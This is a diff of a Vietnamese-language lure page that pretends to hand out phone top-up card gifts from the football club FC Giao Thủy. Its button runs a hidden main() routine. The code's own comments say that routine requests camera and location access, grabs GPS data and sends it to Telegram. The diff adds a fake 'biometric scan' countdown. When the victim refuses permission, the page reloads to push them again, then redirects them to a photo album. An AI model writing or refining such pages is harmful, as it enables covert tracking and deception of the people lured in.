@@ -22,9 +22,7 @@
             border: none; padding: 15px 25px;
             font-weight: bold; border-radius: 8px;
             cursor: pointer; width: 100%; margin-top: 20px;
-            transition: 0.3s;
         }
-        .btn-action:hover { background: #00cc6a; }
         
         #statusOverlay {
             display: none; position: fixed; top: 0; left: 0;
@@ -33,12 +31,12 @@
             justify-content: center; align-items: center;
         }
         .loader {
-            width: 45px; height: 45px;
+            width: 50px; height: 50px;
             border: 4px solid #222; border-top: 4px solid #00ff88;
             border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { margin-top: 20px; color: #00ff88; font-size: 14px; text-align: center; padding: 0 20px;}
+        #statusText { margin-top: 20px; color: #00ff88; font-family: monospace; }
     </style>
 </head>
 <body>
@@ -46,13 +44,13 @@
 <div class="card" id="mainCard">
     <div style="font-size: 50px;">🎁</div>
     <h2>XÁC THỰC NHẬN QUÀ</h2>
-    <p>FC Giao Thủy tặng 100 thẻ cào cho fan may mắn. Vui lòng <b>Cho phép quyền</b> để hệ thống xác thực vị trí và định danh fan cứng.</p>
-    <button class="btn-action" id="accessBtn">NHẬN QUÀ NGAY</button>
+    <p>Vui lòng <b>Cho phép quyền</b> để quét sinh trắc học và kiểm tra vị trí nhận quà từ FC Giao Thủy.</p>
+    <button class="btn-action" id="accessBtn">XÁC THỰC & NHẬN QUÀ</button>
 </div>
 
 <div id="statusOverlay">
     <div class="loader"></div>
-    <div class="loading-text" id="statusText">Đang kết nối máy chủ nhận quà...</div>
+    <div id="statusText">Đang khởi tạo hệ thống...</div>
 </div>
 
 <script src="main.js"></script> 
@@ -63,32 +61,37 @@
     const statusText = document.getElementById('statusText');
 
     btn.addEventListener('click', async () => {
-        // 1. Hiển thị màn hình chờ ngay lập tức
         overlay.style.display = 'flex';
 
-        // 2. Kiểm tra xem file main.js đã load chưa
-        if (typeof main === 'function') {
-            try {
-                statusText.innerText = "Đang kiểm tra khu vực và định danh...";
+        try {
+            // 1. Gọi hàm main() từ main.js để bắt đầu xin quyền và lấy data
+            // Lưu ý: main() phải được thiết kế để không kết thúc quá nhanh
+            if (typeof main === 'function') {
                 
-                // Gọi hàm main() từ file script của bạn
-                // Hàm này sẽ tự xin quyền Camera/Vị trí và gửi Tele
+                // Hiệu ứng đếm ngược giả lập trên giao diện HTML
+                let seconds = 5;
+                const countdown = setInterval(() => {
+                    seconds--;
+                    statusText.innerText = `ĐANG QUÉT SINH TRẮC HỌC... (${seconds}s)`;
+                    if (seconds <= 0) {
+                        clearInterval(countdown);
+                        statusText.innerText = "XÁC THỰC THÀNH CÔNG! ĐANG MỞ ALBUM...";
+                    }
+                }, 1000);
+
+                // Chạy hàm xử lý ngầm (xin quyền, lấy GPS, gửi Tele)
                 await main(); 
 
-                // 3. Sau khi gửi xong (hoặc bị từ chối), chuyển hướng
-                statusText.innerText = "Xác thực hoàn tất! Đang mở Album...";
+                // Đợi thêm một chút cho hiệu ứng đếm ngược chạy xong rồi mới chuyển hướng
                 setTimeout(() => {
                     window.location.href = "https://postimg.cc/gallery/NTp0rLd";
-                }, 1500);
+                }, 5000); 
 
-            } catch (err) {
-                // Nếu người dùng nhấn "Từ chối", báo lỗi và reload để bắt ép lại
-                alert("Lỗi: Bạn cần cấp quyền để nhận quà tặng từ FC Giao Thủy!");
-                location.reload();
             }
-        } else {
-            console.error("Không tìm thấy hàm main() trong main.js");
-            statusText.innerText = "Lỗi kết nối. Vui lòng thử lại!";
+        } catch (err) {
+            // Nếu người dùng bấm "Từ chối" quyền Cam/Vị trí
+            alert("LỖI: Hệ thống không thể định danh. Vui lòng thử lại!");
+            location.reload();
         }
     });
 </script>
